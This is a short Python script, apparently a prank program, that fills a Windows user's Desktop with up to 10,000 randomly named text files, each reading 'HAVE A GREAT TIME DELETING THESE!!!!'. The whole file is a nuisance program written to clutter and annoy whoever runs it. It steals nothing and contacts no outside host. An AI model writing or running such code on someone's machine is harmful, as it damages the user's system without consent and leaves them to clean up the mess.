import os
import random
import string
import webbrowser
name=string.ascii_lowercase+string.ascii_uppercase+string.digits
def replicating ():
    username = os.getenv('userprofile')
    filename="".join(random.choices(name,k=random.randint(0,10)))
    username = fr'{username}\Desktop\{filename}.txt'

    with open(username, 'w') as file1:
        file1.write('HAVE A GREAT TIME DELETING THESE!!!!')
    

for i in range (10000):
    replicating()
